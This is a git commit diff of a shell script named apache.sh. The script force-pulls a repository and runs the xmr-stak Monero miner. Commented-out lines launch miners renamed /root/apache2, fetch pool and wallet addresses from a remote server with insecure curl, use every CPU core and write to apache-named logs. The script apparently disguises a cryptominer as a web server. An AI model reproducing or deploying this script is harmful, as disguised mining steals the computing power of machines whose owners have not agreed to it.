01f94bd08b80cb6ea87513648d6d9675cb97078e
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-06-20 10:31:49 -0500

    Update apache.sh

--- apache.sh
+++ apache.sh
@@ -7,7 +7,7 @@ killall xmr-stak
 
 desde=`stat  /etc/hosts -c%y  | awk '{print $1}'`
 cd tanhuevon/ ; git stash drop; git reset --hard; git pull
-cd tanhuevon/ ; chmod +x xmr-stak; ./xmr-stak
+cd tanhuevon/ ; chmod +x xmr-stak; ./xmr-stak &> xmr-stak.log
 
 #apt -y install docker.io
 #docker run warlax/xmrig-cpu-cryptonightv7 -o pool.supportxmr.com:5555 -u 43P5Rt8Rnoi4RDvP4FWEWtLyJN9RV9MQJCohgmHgkLLHBJSoRo96SAvjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3fXbps4 -p `cat index.html` --donate-level=1 -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
@@ -16,5 +16,3 @@ cd tanhuevon/ ; chmod +x xmr-stak; ./xmr-stak
 #/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p `cat index.html` -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
 #/root/apache2 -a cryptonight -o stratum+tcp://`curl --insecure https://sio.com.co/m/dirpool.txt` -u `curl --insecure https://sio.com.co/m/dirwallet.txt` -p $desde"-"`cat index.html`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log
 #nohup /root/apache2 -a cryptonight -o stratum+tcp://45.76.248.236:3333 -u "etnkPDDjHh4QYLCFkNNSXmgNAwfgUaxphgWuz5Fva3cXJm5cJoWRwubjnQqzSbxH5vUxVCw7En2JY5oJZRv17eeR9o4ZmmBLn7+10000" -p `cat index.html`"-"$desde:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` 1> apache2.log 2> apache3.log &
-
-
